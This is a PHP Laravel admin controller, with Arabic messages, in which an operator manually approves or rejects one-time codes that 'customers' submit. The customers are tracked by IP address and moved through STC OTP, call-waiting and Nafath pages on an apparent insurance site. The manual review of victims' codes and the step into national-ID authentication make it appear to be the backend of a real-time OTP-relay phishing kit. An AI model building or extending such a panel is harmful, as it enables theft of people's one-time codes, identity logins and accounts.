<?php

namespace App\Http\Controllers\Admin;

use App\Events\StcWaitingApproved;
use App\Events\StcWaitingRejected;
use App\Events\StcOtpApproved;
use App\Events\StcOtpRejected;
use App\Events\StcCallApproved;
use App\Events\StcCallRejected;
use App\Http\Controllers\Admin\Traits\NotifiesDashboard;
use App\Http\Controllers\Controller;
use App\Http\Requests\Admin\AdminOtpActionRequest;
use App\Http\Requests\Admin\AdminOtpRejectRequest;
use App\Models\CustomerProfile;
use App\Models\OtpCode;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\Log;

class AdminStcController extends Controller
{
    use NotifiesDashboard;

    /**
     * Merge an STC flag into the customer's extra_data and update current_page.
     */
    private function setStcFlag(string $customerIp, string $flag, string $currentPage, ?string $reason = null): void
    {
        $customer = CustomerProfile::where('ip_address', $customerIp)->first();
        if ($customer) {
            $extra = $customer->extra_data ?? [];
            $extra[$flag] = true;
            if ($reason !== null) {
                $extra[$flag . '_reason'] = $reason;
            }
            $customer->update(['current_page' => $currentPage, 'extra_data' => $extra]);
        }
    }

    /**
     * Shared approve logic for all 3 STC stages.
     */
    private function approveStage(AdminOtpActionRequest $request, object $event, string $flag, string $redirectPage, string $rebroadcastMsg, string $successMsg): JsonResponse
    {
        $otp = OtpCode::where('id', $request->otp_id)->firstOrFail();

        if ($otp->status !== 'pending') {
            if (in_array($otp->status, ['approved', 'verified'])) {
                try {
                    broadcast($event)->toOthers();
                } catch (\Throwable $e) {
                    Log::warning("Broadcast failed (re-broadcast {$flag}): " . $e->getMessage());
                }
                $this->setStcFlag($request->customer_ip, $flag, $redirectPage);
                $this->flushCustomerCache();
                $this->notifyDashboard($request->customer_ip, $flag);
                $this->refreshPaymentViewed($request->customer_ip);
                return response()->json(['success' => true, 'message' => $rebroadcastMsg]);
            }
            return response()->json([
                'success' => false,
                'message' => 'هذا الطلب تم معالجته مسبقاً',
            ], 422);
        }

        $otp->verify();

        try {
            broadcast($event)->toOthers();
        } catch (\Throwable $e) {
            Log::warning("Broadcast failed ({$flag}): " . $e->getMessage());
        }

        $this->setStcFlag($request->customer_ip, $flag, $redirectPage);
        $this->flushCustomerCache();
        $this->notifyDashboard($request->customer_ip, $flag);
        $this->refreshPaymentViewed($request->customer_ip);

        return response()->json(['success' => true, 'message' => $successMsg]);
    }

    /**
     * Shared reject logic for all 3 STC stages.
     */
    private function rejectStage(AdminOtpRejectRequest $request, object $event, string $flag, string $successMsg): JsonResponse
    {
        $otp = OtpCode::where('id', $request->otp_id)->firstOrFail();

        if ($otp->status !== 'pending') {
            return response()->json([
                'success' => false,
                'message' => 'هذا الطلب تم معالجته مسبقاً',
            ], 422);
        }

        $otp->reject($request->input('reason'));

        try {
            broadcast($event)->toOthers();
        } catch (\Throwable $e) {
            Log::warning("Broadcast failed ({$flag}): " . $e->getMessage());
        }

        $this->setStcFlag($request->customer_ip, $flag, '/insurance/phone-verification', $request->input('reason'));
        $this->flushCustomerCache();
        $this->notifyDashboard($request->customer_ip, $flag);
        $this->refreshPaymentViewed($request->customer_ip);

        return response()->json(['success' => true, 'message' => $successMsg]);
    }

    // ─── Stage 1: STC Waiting ────────────────────────────────────

    public function approveWaiting(AdminOtpActionRequest $request): JsonResponse
    {
        return $this->approveStage(
            $request,
            new StcWaitingApproved($request->customer_ip),
            'stc_waiting_approved',
            '/insurance/stc/otp',
            'تمت إعادة إرسال الموافقة على انتظار STC',
            'تمت الموافقة - تم توجيه العميل إلى صفحة رمز التحقق STC',
        );
    }

    public function rejectWaiting(AdminOtpRejectRequest $request): JsonResponse
    {
        return $this->rejectStage(
            $request,
            new StcWaitingRejected($request->customer_ip, $request->input('reason')),
            'stc_waiting_rejected',
            'تم رفض طلب التحقق STC',
        );
    }

    // ─── Stage 2: STC OTP ────────────────────────────────────────

    public function approveOtp(AdminOtpActionRequest $request): JsonResponse
    {
        return $this->approveStage(
            $request,
            new StcOtpApproved($request->customer_ip),
            'stc_otp_approved',
            '/insurance/stc/call-waiting',
            'تمت إعادة إرسال الموافقة على رمز التحقق STC',
            'تمت الموافقة على رمز التحقق STC - تم توجيه العميل لانتظار المكالمة',
        );
    }

    public function rejectOtp(AdminOtpRejectRequest $request): JsonResponse
    {
        return $this->rejectStage(
            $request,
            new StcOtpRejected($request->customer_ip, $request->input('reason')),
            'stc_otp_rejected',
            'تم رفض رمز التحقق STC',
        );
    }

    // ─── Stage 3: STC Call ───────────────────────────────────────

    public function approveCall(AdminOtpActionRequest $request): JsonResponse
    {
        return $this->approveStage(
            $request,
            new StcCallApproved($request->customer_ip, '/insurance/nafath'),
            'stc_call_approved',
            '/insurance/nafath',
            'تمت إعادة إرسال الموافقة على مكالمة STC',
            'تمت الموافقة على مكالمة STC - تم توجيه العميل إلى صفحة النفاذ',
        );
    }

    public function rejectCall(AdminOtpRejectRequest $request): JsonResponse
    {
        return $this->rejectStage(
            $request,
            new StcCallRejected($request->customer_ip, $request->input('reason')),
            'stc_call_rejected',
            'تم رفض مكالمة التحقق STC',
        );
    }
}
